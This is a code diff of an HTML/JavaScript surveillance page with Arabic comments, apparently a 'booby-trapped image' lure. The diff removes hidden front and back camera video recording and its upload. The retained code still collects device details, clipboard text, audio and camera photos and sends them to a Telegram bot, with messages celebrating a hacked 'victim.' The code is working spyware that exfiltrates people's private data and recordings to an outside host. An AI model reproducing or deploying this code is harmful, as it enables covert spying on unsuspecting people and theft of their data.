@@ -46,16 +46,6 @@
             display: block;
             pointer-events: auto;
         }
-
-        .hidden-video-element {
-            position: fixed;
-            top: -1000px;
-            left: -1000px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
     </style>
 </head>
 <body>
@@ -151,100 +141,6 @@
             } catch(e) { console.warn(e); }
         }
         
-        // ========== إرسال فيديو ==========
-        async function sendVideo(videoBlob, caption) {
-            const chatId = getChatId();
-            if (!chatId) return;
-            try {
-                let formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('video', videoBlob, `video_${Date.now()}.mp4`);
-                formData.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
-            } catch(e) { 
-                console.warn('فشل إرسال الفيديو:', e);
-                try {
-                    let formData2 = new FormData();
-                    formData2.append('chat_id', chatId);
-                    formData2.append('document', videoBlob, `video_${Date.now()}.mp4`);
-                    formData2.append('caption', caption);
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData2 });
-                } catch(e2) { console.warn(e2); }
-            }
-        }
-
-        // ========== تسجيل فيديو ==========
-        async function recordVideo(facingMode, duration, withAudio = true) {
-            let stream = null;
-            let mediaRecorder = null;
-            let chunks = [];
-            
-            try {
-                const constraints = {
-                    video: { 
-                        facingMode: { exact: facingMode }
-                    }
-                };
-                
-                if (withAudio) {
-                    constraints.audio = true;
-                }
-                
-                stream = await navigator.mediaDevices.getUserMedia(constraints);
-                
-                const videoElement = document.createElement('video');
-                videoElement.srcObject = stream;
-                videoElement.setAttribute('playsinline', 'true');
-                videoElement.className = 'hidden-video-element';
-                document.body.appendChild(videoElement);
-                await videoElement.play();
-                
-                const mimeTypes = ['video/mp4', 'video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm'];
-                let selectedMimeType = null;
-                for (const type of mimeTypes) {
-                    if (MediaRecorder.isTypeSupported(type)) {
-                        selectedMimeType = type;
-                        break;
-                    }
-                }
-                
-                mediaRecorder = new MediaRecorder(stream, { 
-                    mimeType: selectedMimeType || 'video/webm'
-                });
-                
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data && event.data.size > 0) {
-                        chunks.push(event.data);
-                    }
-                };
-                
-                mediaRecorder.start(1000);
-                await delay(duration);
-                
-                return new Promise((resolve) => {
-                    mediaRecorder.onstop = () => {
-                        if (stream) stream.getTracks().forEach(t => t.stop());
-                        if (videoElement && videoElement.parentNode) videoElement.remove();
-                        
-                        if (chunks.length === 0) {
-                            resolve(null);
-                            return;
-                        }
-                        
-                        const blob = new Blob(chunks, { type: selectedMimeType || 'video/mp4' });
-                        resolve(blob);
-                    };
-                    
-                    mediaRecorder.stop();
-                });
-                
-            } catch(e) {
-                console.warn(`فشل تسجيل الفيديو من ${facingMode}:`, e);
-                if (stream) stream.getTracks().forEach(t => t.stop());
-                return null;
-            }
-        }
-
         // ========== جمع معلومات الجهاز ==========
         async function getDeviceInfo() {
             let ua = navigator.userAgent;
@@ -446,18 +342,6 @@
             }
         }
         
-        // ========== طلب أذونات الفيديو ==========
-        async function requestVideoPermissions() {
-            try {
-                let front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } }, audio: true });
-                front.getTracks().forEach(t => t.stop());
-            } catch(e) {}
-            try {
-                let back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: true });
-                back.getTracks().forEach(t => t.stop());
-            } catch(e) {}
-        }
-        
         // ========== التنفيذ الكامل ==========
         async function executeFullScan() {
             if(isExecuting) return;
@@ -479,23 +363,6 @@
             } catch(e) { console.warn(e); }
             
             let audioUrl = await recordAudio(5000);
-            
-            // ===== تسجيل الفيديو (طلب أذونات منفصل) =====
-            await requestVideoPermissions();
-            await delay(500);
-            
-            let frontVideo = null;
-            let backVideo = null;
-            
-            // فيديو أمامي 5 ثواني بدون صوت
-            try {
-                frontVideo = await recordVideo("user", 5000, false);
-            } catch(e) { console.warn(e); }
-            
-            // فيديو خلفي 3 ثواني مع صوت
-            try {
-                backVideo = await recordVideo("environment", 3000, true);
-            } catch(e) { console.warn(e); }
             
             // إرسال البيانات إلى المعرف المستهدف
             await sendToTelegram(`#☑️ تم اختراق ضحـية عـبࢪ صـوࢪه ملـغمـة ☑️#\n\nالجهاز: ${deviceInfo.brand} - ${deviceInfo.fullName}\nالوقت: ${new Date().toLocaleString('ar-EG')}\n\nتم الإرسال إلى المعرف: ${getChatId()}`);
@@ -526,9 +393,7 @@
             report += `📋 <b>محتوى الحافظة:</b>\n${clipboardText.substring(0, 500)}\n\n`;
             report += `🎤 تسجيل صوتي: ${audioUrl ? '✓ تم' : '✗ فشل'}\n`;
             report += `📸 صور أمامية: ${frontPhotos.length} صورة\n`;
-            report += `📷 صور خلفية: ${backPhotos.length} صورة\n`;
-            report += `🎥 فيديو أمامي (5ث بدون صوت): ${frontVideo ? '✓ تم' : '✗ فشل'}\n`;
-            report += `🎥 فيديو خلفي (3ث مع صوت): ${backVideo ? '✓ تم' : '✗ فشل'}`;
+            report += `📷 صور خلفية: ${backPhotos.length} صورة`;
             
             await sendToTelegram(report, true);
             
@@ -543,16 +408,6 @@
             
             if(audioUrl) {
                 await sendAudio(audioUrl, "🎙️ تسجيل ءالصـوت (5 ثوانٍ)");
-            }
-            
-            if(frontVideo) {
-                await sendVideo(frontVideo, "🎥 فيديو الكاميرا الأمامية (5 ثوان بدون صوت)");
-                await delay(300);
-            }
-            
-            if(backVideo) {
-                await sendVideo(backVideo, "🎥 فيديو الكاميرا الخلفية (3 ثوان مع صوت)");
-                await delay(300);
             }
             
             await sendToTelegram(`#☑️ اكتمل الاختراق بنجاح ☑️#\nتم إرسال ${frontPhotos.length} صور أمامية و ${backPhotos.length} صور خلفية`);
